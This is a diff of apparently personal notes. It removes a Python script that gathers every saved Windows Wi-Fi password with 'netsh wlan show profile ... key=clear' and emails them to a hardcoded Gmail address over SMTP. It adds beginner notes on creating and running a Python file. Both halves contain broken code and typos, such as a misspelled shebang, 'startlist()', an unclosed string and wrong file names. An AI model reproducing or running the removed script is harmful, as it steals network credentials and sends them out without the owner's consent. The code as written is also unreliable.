@@ -1,41 +1,22 @@
-Creating A Scanning Tool
+cd
+mkdir Pythonprograms
+cd Pythonprograms
+nano Test.py
+#!/usr/bin/python
 
+print("Hello World!)
 
-In a windows host you can see the passwords of the wireless connections you have using
+//ctrl + o  to save
+//ctrl + x  to exit
 
-netsh wlan show profile
-//select the network 
-netsh wlan show profile IITT key=clear
+python Tets.py
 
+./Test.py
+//Permission Denied because the test.py is not an executable file so,
 
-#!/use/bin/python
-
-import subprocess, smtplib, re
-
-command = "netsh wlan show profile"
-
-networks = subprocess.check_output(command, shell=True)
-network_list = re.findall('(?:Profile\s*:\s)(.*)', networks)
-
-final_output = ""
-for network in network_list:
-        command2 = "netsh wlan show profile " + network + " key=clear"
-        one_network_result = subprocess.check_output(command2, shell=True)
-        final_output += one_network_result
-
-myemail=raw_input("madeforprojs@gmail.com")
-
-
-server = smtplib.SMTP("smtp.gmail.com",587)
-server.startlist()
-server.login(myemail,"Password")
-server.sendmail(myemail, myemail, final_output)
-server.quit()
-
-
-#file = open("Wifipasswords.txt", 'w')
-#file.write(final_output)
-#file.close()
+chmod +x Test.py
+./Test/py
+//Now its executable and have to do this for all the programs created
 
 
 
